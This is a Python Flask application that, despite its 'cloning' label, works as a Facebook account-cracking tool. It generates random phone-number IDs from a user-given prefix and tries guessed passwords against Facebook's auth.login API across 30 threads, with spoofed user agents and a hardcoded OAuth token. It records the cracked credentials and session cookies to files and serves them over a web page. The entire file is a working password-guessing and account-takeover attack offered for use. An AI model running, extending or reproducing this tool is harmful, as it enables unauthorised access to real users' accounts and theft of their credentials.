import os
import threading
from flask import Flask, request, jsonify, render_template, Response
import requests
import random
import string
from concurrent.futures import ThreadPoolExecutor as tred
import uuid
import sys
from fake_useragent import UserAgent
import time

app = Flask(__name__)
ua = UserAgent()

oks = []
cps = []
loop = 0

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/clone', methods=['POST'])
def clone():
    sim_code = request.form['sim_code']
    limit = int(request.form['limit'])

    # Start the cloning process in a background thread
    threading.Thread(target=start_cloning, args=(sim_code, limit)).start()

    return jsonify({
        "status": "Cloning initiated",
        "message": "The cloning process is running in the background."
    })

@app.route('/results/ok')
def results_ok():
    try:
        with open('/sdcard/PING-OK.txt', 'r') as file:
            ok_results = file.readlines()
    except FileNotFoundError:
        ok_results = []
    
    return '<br>'.join(ok_results)

@app.route('/results/cp')
def results_cp():
    try:
        with open('/sdcard/PING-CP.txt', 'r') as file:
            cp_results = file.readlines()
    except FileNotFoundError:
        cp_results = []
    
    return '<br>'.join(cp_results)

@app.route('/live')
def live():
    return render_template('live.html')

@app.route('/stream')
def stream():
    def generate():
        while True:
            time.sleep(1)
            yield f"data: {len(oks)} successful, {len(cps)} checkpoints, {loop} attempts\n\n"
    
    return Response(generate(), mimetype='text/event-stream')

def start_cloning(sim_code, limit):
    global loop
    user = []
    for _ in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)

    with tred(max_workers=30) as Dipto:
        tl = str(len(user))
        for psx in user:
            ids = sim_code + psx
            passlist = [psx, ids, ids[:7], ids[:6], ids[5:], ids[4:], 'sadiya', 'jannat']
            Dipto.submit(method_crack, ids, passlist)
    
def method_crack(ids, passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            datax = {'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header = {'User-Agent': ua.random, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            url = 'https://api.facebook.com/method/auth.login'
            reqx = requests.post(url, data=datax, headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid = reqx['uid']
                except:
                    uid = ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[PING-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki = ";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    with open('/sdcard/PING-OK.txt', 'a') as f:
                        f.write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[PING-CP] '+ids+' | '+pas+'\033[1;37m')
                with open('/sdcard/PING-CP.txt', 'a') as f:
                    f.write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop += 1
    except:
        pass

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
